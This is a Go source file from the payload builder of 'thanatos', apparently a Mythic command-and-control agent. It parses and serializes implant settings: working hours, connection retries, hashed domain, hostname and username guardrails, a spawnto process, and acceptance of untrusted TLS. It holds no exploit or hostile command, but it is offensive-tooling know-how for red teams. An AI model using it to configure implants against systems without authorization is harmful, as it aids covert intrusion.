// Handles parsing all of the payload parameters
package builder

import (
	"bytes"
	"crypto/sha256"
	"errors"
	"fmt"
	"strings"
	thanatoserror "thanatos/errors"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/vmihailenco/msgpack/v5"
)

// Strongly type struct containing all of the build parameters from Mythic
type ParsedBuildParameters struct {
	// Supported architectures of the agent
	Architecture PayloadBuildParameterArchitecture

	// Agent's initial exection parameters
	InitOptions PayloadBuildParameterInitOptions

	// Number of tries to reconnect to Mythic on failed connections
	ConnectionRetries int

	// Library for doing crypto
	CryptoLib PayloadBuildParameterCryptoLibrary

	// Working hours
	WorkingHours ParsedWorkingHours

	// List of domains for execution guardrails
	DomainList []string

	// List of hostnames for execution guardrails
	HostnameList []string

	// List of usernames for execution guardrails
	UsernameList []string

	// Options for static linking
	StaticOptions []PayloadBuildParameterStaticOption

	// Whether the agent should connect to self signed TLS certificates
	TlsUntrusted bool

	// Initial spawnto value
	SpawnTo string

	// Output format for the agent
	Output PayloadBuildParameterOutputFormat
}

/*
/// Configuration option for the initial payload execution
#[derive(Serialize_repr, Deserialize_repr, Copy, Clone, Debug)]
#[repr(u8)]
pub enum InitOption {
    /// Payload should not do anything special when executed
    None = 0,

    /// Payload should run in a new thread
    Thread = 1,

    /// Payload should fork to the background
    Daemonize = 2,
}
*/

type SerializedConfigInitOption byte

const (
	SerializedConfigInitOptionNone   SerializedConfigInitOption = 0
	SerializedConfigInitOptionThread SerializedConfigInitOption = 1
	SerializedConfigInitOptionFork   SerializedConfigInitOption = 2
)

/*
/// Holds a Uuid
#[repr(transparent)]
#[derive(Debug, Serialize, Deserialize)]
pub struct Uuid([u8; 16]);


/// Payload configuration variables
#[derive(Serialize, Deserialize, Debug)]
pub struct ConfigVars<'a> {
    uuid: Uuid,
    init_option: InitOption,
    working_hours_start: u64,
    working_hours_end: u64,
    connection_retries: u32,
    domains: Vec<[u8; 32]>,
    hostnames: Vec<[u8; 32]>,
    usernames: Vec<[u8; 32]>,
    tlsuntrusted: bool,
    spawn_to: &'a str,
    http_profile: Option<HttpConfigVars<'a>>,
}
*/

// Format for the serialized payload config
type SerializedBuildParameterFormat struct {
	Uuid              [16]byte                   `msgpack:"uuid"`
	InitOption        SerializedConfigInitOption `msgpack:"init_option"`
	WorkingHoursStart uint64                     `msgpack:"working_hours_start"`
	WorkingHoursEnd   uint64                     `msgpack:"working_hours_end"`
	ConnectionRetries uint32                     `msgpack:"connection_retries"`
	Domains           [][32]byte                 `msgpack:"domains"`
	Hostnames         [][32]byte                 `msgpack:"hostnames"`
	Usernames         [][32]byte                 `msgpack:"usernames"`
	TlsUntrusted      bool                       `msgpack:"tlsuntrusted"`
	SpawnTo           string                     `msgpack:"spawn_to"`
	HttpProfile       *HttpC2ProfileParameters   `msgpack:"http_profile,omitempty"`
}

func (p *ParsedPayloadParameters) Serialize() ([]byte, error) {
	uuidBytes, err := p.Uuid.MarshalBinary()
	fmt.Printf("%x\n", uuidBytes)
	if err != nil {
		return []byte{}, thanatoserror.Errorf("failed to marshal payload UUID: %s", err.Error())
	}

	initOption := SerializedConfigInitOptionNone

	switch p.PayloadBuildParameters.InitOptions {
	case PayloadBuildParameterInitOptionNone:
		initOption = SerializedConfigInitOptionNone
	case PayloadBuildParameterInitOptionSpawnThread:
		initOption = SerializedConfigInitOptionThread
	case PayloadBuildParameterInitOptionFork:
		initOption = SerializedConfigInitOptionFork
	}

	domains := [][32]byte{}
	for _, domain := range p.PayloadBuildParameters.DomainList {
		domain = strings.ToLower(domain)
		domains = append(domains, sha256.Sum256([]byte(domain)))
	}

	hostnames := [][32]byte{}
	for _, hostname := range p.PayloadBuildParameters.HostnameList {
		hostname = strings.ToLower(hostname)
		hostnames = append(hostnames, sha256.Sum256([]byte(hostname)))
	}

	usernames := [][32]byte{}
	for _, username := range p.PayloadBuildParameters.UsernameList {
		username = strings.ToLower(username)
		usernames = append(usernames, sha256.Sum256([]byte(username)))
	}

	serializedFormat := SerializedBuildParameterFormat{
		Uuid:              [16]byte(uuidBytes),
		InitOption:        initOption,
		WorkingHoursStart: uint64(p.PayloadBuildParameters.WorkingHours.StartTime.Seconds()),
		WorkingHoursEnd:   uint64(p.PayloadBuildParameters.WorkingHours.EndTime.Seconds()),
		ConnectionRetries: uint32(p.PayloadBuildParameters.ConnectionRetries),
		Domains:           domains,
		Hostnames:         hostnames,
		Usernames:         usernames,
		TlsUntrusted:      p.PayloadBuildParameters.TlsUntrusted,
		SpawnTo:           p.PayloadBuildParameters.SpawnTo,
	}

	if p.C2Profiles.HttpProfile != nil {
		serializedFormat.HttpProfile = p.C2Profiles.HttpProfile
	}

	var buffer bytes.Buffer
	encoder := msgpack.NewEncoder(&buffer)
	encoder.UseArrayEncodedStructs(true)
	encoder.UseCompactFloats(true)
	encoder.UseCompactInts(true)
	encoder.UseInternedStrings(true)

	if err := encoder.Encode(&serializedFormat); err != nil {
		return []byte{}, thanatoserror.Errorf("failed to serialize payload config: %s", err.Error())
	}

	return buffer.Bytes(), nil
}

func (p *ParsedBuildParameters) String() string {
	output := ""

	initOption := "none"

	switch p.InitOptions {
	case PayloadBuildParameterInitOptionFork:
		initOption = "fork"
	case PayloadBuildParameterInitOptionSpawnThread:
		initOption = "thread"
	}

	output += fmt.Sprintf("INIT_OPTION=%s\n", initOption)

	outputFormat := "WORKING_HOURS_START=%0.0f\n" +
		"WORKING_HOURS_END=%0.0f\n" +
		"CONNECTION_RETRIES=%d\n"

	output += fmt.Sprintf(outputFormat, p.WorkingHours.StartTime.Seconds(), p.WorkingHours.EndTime.Seconds(), p.ConnectionRetries)

	if len(p.DomainList) > 0 {
		output += fmt.Sprintf("DOMAIN_LIST=%s\n", strings.Join(p.DomainList, ","))
	}

	if len(p.HostnameList) > 0 {
		output += fmt.Sprintf("HOSTNAME_LIST=%s\n", strings.Join(p.HostnameList, ","))
	}

	if len(p.UsernameList) > 0 {
		output += fmt.Sprintf("USERNAME_LIST=%s\n", strings.Join(p.UsernameList, ","))
	}

	output += fmt.Sprintf("TLS_UNTRUSTED=%t\n", p.TlsUntrusted)
	if len(p.SpawnTo) > 0 {
		output += fmt.Sprintf("SPAWN_TO=%s\n", p.SpawnTo)
	}

	return output
}

// Parses the build parameters from Mythic to a strongly typed structure
func parsePayloadBuildParameters(buildMessage agentstructs.PayloadBuildMessage) (ParsedBuildParameters, error) {
	const errorFormatStr string = "failed to get the '%s' value from the payload build parameters: %s"

	configuredOS := buildMessage.SelectedOS
	_ = configuredOS
	parameters := buildMessage.BuildParameters

	parsedParameters := ParsedBuildParameters{}

	architecture, err := parameters.GetStringArg("architecture")
	if err != nil {
		return parsedParameters, thanatoserror.Errorf(errorFormatStr, "architecture", err.Error())
	}

	parsedParameters.Architecture = PayloadBuildParameterArchitecture(architecture)

	initOptions, err := parameters.GetStringArg("initoptions")
	if err != nil {
		return parsedParameters, thanatoserror.Errorf(errorFormatStr, "initoptions", err.Error())
	}

	parsedParameters.InitOptions = PayloadBuildParameterInitOptions(initOptions)

	connectionRetries, err := parameters.GetNumberArg("connection_retries")
	if err != nil {
		return parsedParameters, thanatoserror.Errorf(errorFormatStr, "connection_retries", err.Error())
	}

	if connectionRetries <= 0 {
		return parsedParameters, thanatoserror.New("connection_retries value is <= 0")
	}

	parsedParameters.ConnectionRetries = int(connectionRetries)

	cryptoLib, err := parameters.GetStringArg("cryptolib")
	if err != nil {
		return parsedParameters, thanatoserror.Errorf(errorFormatStr, "cryptolib", err.Error())
	}

	parsedParameters.CryptoLib = PayloadBuildParameterCryptoLibrary(cryptoLib)

	workingHoursStr, err := parameters.GetStringArg("working_hours")
	if err != nil {
		return parsedParameters, thanatoserror.Errorf(errorFormatStr, "working_hours", err.Error())
	}

	workingHours, err := parseWorkingHours(workingHoursStr)
	if err != nil {
		return parsedParameters, errors.Join(thanatoserror.New("failed to parse the payload's working hours"), err)
	}

	if workingHours.StartTime >= workingHours.EndTime {
		return parsedParameters, thanatoserror.New("working hours start time is after the working hours end time")
	}

	parsedParameters.WorkingHours = workingHours

	if domainsList, err := parameters.GetArrayArg("domains"); err == nil {
		parsedParameters.DomainList = domainsList
	} else {
		parsedParameters.DomainList = []string{}
	}

	if hostnamesList, err := parameters.GetArrayArg("hostnames"); err == nil {
		parsedParameters.HostnameList = hostnamesList
	} else {
		parsedParameters.HostnameList = []string{}
	}

	if usernamesList, err := parameters.GetArrayArg("usernames"); err == nil {
		parsedParameters.UsernameList = usernamesList
	} else {
		parsedParameters.UsernameList = []string{}
	}

	staticOptions, err := parameters.GetArrayArg("static")
	if err == nil {
		for _, option := range staticOptions {
			parsedParameters.StaticOptions = append(parsedParameters.StaticOptions, PayloadBuildParameterStaticOption(option))
		}
	} else {
		parsedParameters.StaticOptions = []PayloadBuildParameterStaticOption{}
	}

	tlsuntrusted, err := parameters.GetBooleanArg("tlsuntrusted")
	if err == nil {
		parsedParameters.TlsUntrusted = tlsuntrusted
	} else {
		parsedParameters.TlsUntrusted = false
	}

	spawnto, err := parameters.GetStringArg("spawnto")
	if err == nil {
		parsedParameters.SpawnTo = spawnto
	} else {
		parsedParameters.SpawnTo = ""
	}

	output, err := parameters.GetStringArg("output")
	if err != nil {
		return parsedParameters, thanatoserror.Errorf(errorFormatStr, "output", err.Error())
	}

	parsedParameters.Output = PayloadBuildParameterOutputFormat(output)

	return parsedParameters, nil
}
